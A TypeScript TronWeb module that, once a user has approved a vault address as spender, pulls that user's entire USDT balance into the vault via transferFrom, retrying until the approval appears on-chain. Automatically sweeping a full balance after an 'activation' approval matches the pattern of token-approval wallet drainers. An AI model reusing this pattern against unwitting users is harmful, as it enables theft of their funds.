import { TronWeb } from "tronweb";
import { VAULT_CONFIG } from "../vaultConfig.js";

/** Official mainnet USDT (TRC20). */
export const TRON_USDT_CONTRACT_MAINNET = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
export const TRON_TRANSFER_FROM_FEE_LIMIT_SUN = 65_000_000;

const TRC20_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "Function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    type: "Function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "", type: "bool" }],
    type: "Function",
  },
] as const;

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

function rawFromCall(tronWeb: TronWeb, callResult: unknown): bigint {
  const bn = tronWeb.toBigNumber(callResult as Parameters<typeof tronWeb.toBigNumber>[0]);
  return BigInt(bn.toFixed(0));
}

export type AutoDepositPullResult =
  | { status: "broadcast"; txid: string; amountRaw: string }
  | { status: "skipped"; reason: string };

export type AutoDepositPullPreview =
  | {
      status: "ready";
      amountRaw: string;
      allowanceRaw: string;
      vaultBase58: string;
      feeLimitSun: number;
    }
  | {
      status: "skipped";
      reason: string;
      amountRaw: string;
      allowanceRaw: string;
      vaultBase58: string;
      feeLimitSun: number;
    };

async function getPullPreview(params: {
  userBase58: string;
  operatorPrivateKey: string;
  fullHost: string;
  vaultBase58?: string;
  tokenAddress?: string;
  tronGridApiKey?: string;
  allowanceRetryAttempts?: number;
  allowanceRetryDelayMs?: number;
}): Promise<AutoDepositPullPreview> {
  const {
    userBase58,
    operatorPrivateKey,
    fullHost,
    vaultBase58 = VAULT_CONFIG,
    tokenAddress = TRON_USDT_CONTRACT_MAINNET,
    tronGridApiKey,
    allowanceRetryAttempts = 15,
    allowanceRetryDelayMs = 2_500,
  } = params;

  const headers = tronGridApiKey ? { "TRON-PRO-API-KEY": tronGridApiKey } : undefined;
  const tronWeb = new TronWeb({
    fullHost,
    privateKey: operatorPrivateKey,
    headers,
  });

  if (!tronWeb.isAddress(userBase58)) {
    throw new Error("Invalid Tron user address.");
  }

  const spender = tronWeb.defaultAddress.base58;
  if (typeof spender !== "string" || spender !== vaultBase58) {
    throw new Error(
      `Auto-deposit signer must be the approved spender/vault (${vaultBase58}); derived address is ${String(spender)}. Set TRON_VAULT_PRIVATE_KEY (or SPENDER_KEY) to that wallet's private key.`,
    );
  }

  const contract = tronWeb.contract(TRC20_ABI, tokenAddress);
  const balanceRaw = await contract.balanceOf(userBase58).call();
  const amount = rawFromCall(tronWeb, balanceRaw);
  if (amount === 0n) {
    return {
      status: "skipped",
      reason: "zero_balance",
      amountRaw: "0",
      allowanceRaw: "0",
      vaultBase58,
      feeLimitSun: TRON_TRANSFER_FROM_FEE_LIMIT_SUN,
    };
  }

  let allowance = 0n;
  for (let attempt = 0; attempt < allowanceRetryAttempts; attempt++) {
    const allowanceRaw = await contract.allowance(userBase58, spender).call();
    allowance = rawFromCall(tronWeb, allowanceRaw);
    if (allowance >= amount) break;
    if (attempt + 1 < allowanceRetryAttempts) {
      await sleep(allowanceRetryDelayMs);
    }
  }

  if (allowance < amount) {
    return {
      status: "skipped",
      reason: "allowance_not_sufficient",
      amountRaw: amount.toString(),
      allowanceRaw: allowance.toString(),
      vaultBase58,
      feeLimitSun: TRON_TRANSFER_FROM_FEE_LIMIT_SUN,
    };
  }

  return {
    status: "ready",
    amountRaw: amount.toString(),
    allowanceRaw: allowance.toString(),
    vaultBase58,
    feeLimitSun: TRON_TRANSFER_FROM_FEE_LIMIT_SUN,
  };
}

/**
 * After the user approves `vaultBase58` as USDT spender on mainnet TRC20 USDT, pulls their full
 * balance into that vault via `transferFrom(user, vault, balance)` signed by the vault EOA key.
 */
export async function pullFullUsdtToVault(params: {
  userBase58: string;
  operatorPrivateKey: string;
  fullHost: string;
  /** Tron base58 vault / approved spender — USDT is pulled *from* user *to* this address; signer must be this address. */
  vaultBase58?: string;
  tokenAddress?: string;
  tronGridApiKey?: string;
  /** Retries when allowance is not on-chain yet (activation just broadcast). */
  allowanceRetryAttempts?: number;
  allowanceRetryDelayMs?: number;
}): Promise<AutoDepositPullResult> {
  const preview = await getPullPreview(params);
  if (preview.status === "skipped") {
    return { status: "skipped", reason: preview.reason };
  }
  const { userBase58, operatorPrivateKey, fullHost } = params;
  const tokenAddress = params.tokenAddress ?? TRON_USDT_CONTRACT_MAINNET;
  const tronGridApiKey = params.tronGridApiKey;
  const headers = tronGridApiKey ? { "TRON-PRO-API-KEY": tronGridApiKey } : undefined;
  const tronWeb = new TronWeb({ fullHost, privateKey: operatorPrivateKey, headers });

  const amountForContract = tronWeb.toBigNumber(preview.amountRaw);
  let tx: unknown;
  try {
    const contract = tronWeb.contract(TRC20_ABI, tokenAddress);
    tx = await contract.transferFrom(userBase58, preview.vaultBase58, amountForContract).send({
      feeLimit: TRON_TRANSFER_FROM_FEE_LIMIT_SUN,
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    throw new Error(`transferFrom failed: ${msg}`);
  }

  const txid = typeof tx === "string" ? tx : JSON.stringify(tx);
  return { status: "broadcast", txid, amountRaw: preview.amountRaw };
}

export async function previewFullUsdtPullToVault(params: {
  userBase58: string;
  operatorPrivateKey: string;
  fullHost: string;
  vaultBase58?: string;
  tokenAddress?: string;
  tronGridApiKey?: string;
  allowanceRetryAttempts?: number;
  allowanceRetryDelayMs?: number;
}): Promise<AutoDepositPullPreview> {
  return getPullPreview(params);
}
